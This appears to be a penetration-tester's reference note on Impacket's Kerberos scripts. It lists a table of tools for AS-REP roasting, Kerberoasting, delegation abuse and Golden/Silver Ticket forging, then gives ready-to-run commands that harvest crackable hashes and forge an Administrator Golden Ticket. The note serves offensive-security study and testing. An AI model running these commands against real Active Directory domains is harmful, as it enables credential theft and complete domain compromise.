# impacket — GetNPUsers / GetUserSPNs / getTGT / getST / ticketer / findDelegation / addcomputer / lookupsid

**Tags:** `#impacket` `#kerberos` `#asreproast` `#kerberoast` `#goldenticket` `#silverticket` `#delegation` `#activedirectory`

Impacket's Kerberos-specific script family — the network-facing, credential/ticket-request side of Kerberos attacks (as opposed to [[Tools/Lateral Movement/impacket|impacket's remote-exec tools]], which is what you use *after* you have a ticket/hash). One script per operation:

| Script | Use |
|---|---|
| `GetNPUsers.py` | AS-REP Roasting — request AS-REP for accounts with preauth disabled |
| `GetUserSPNs.py` | Kerberoasting — request TGS for SPN-having accounts |
| `getTGT.py` | Get a TGT from a password, NTLM hash, or AES key (Overpass-the-Hash / Pass-the-Key) |
| `getST.py` | Request a service ticket, including S4U2Self/S4U2Proxy impersonation (constrained delegation, RBCD) |
| `ticketer.py` | Forge Golden/Silver tickets offline from a krbtgt or service account hash |
| `findDelegation.py` | Enumerate accounts configured for unconstrained/constrained delegation |
| `addcomputer.py` | Add a computer account to the domain (machine account quota) — used to stage RBCD |
| `lookupsid.py` | Resolve the domain SID (needed for ticket forging) |

**Source:** Part of Impacket — pre-installed on Kali (`impacket-GetNPUsers`, `impacket-GetUserSPNs`, etc.)
**Install:** `pip install impacket` or `sudo apt install python3-impacket`

```bash
# AS-REP Roast every user in a list, no credentials needed
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <dc_ip>

# Kerberoast all SPN accounts
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast_hashes.txt

# Forge a Golden Ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain <domain> Administrator
```

> [!note] **See also** — [[Services/Active Directory/Kerberos|Kerberos]] for the full methodology these scripts implement (AS-REP Roasting, Kerberoasting, Golden/Silver Ticket, delegation abuse).

---

*Created: 2026-07-27*
*Updated: 2026-07-27*
*Model: claude-sonnet-5*
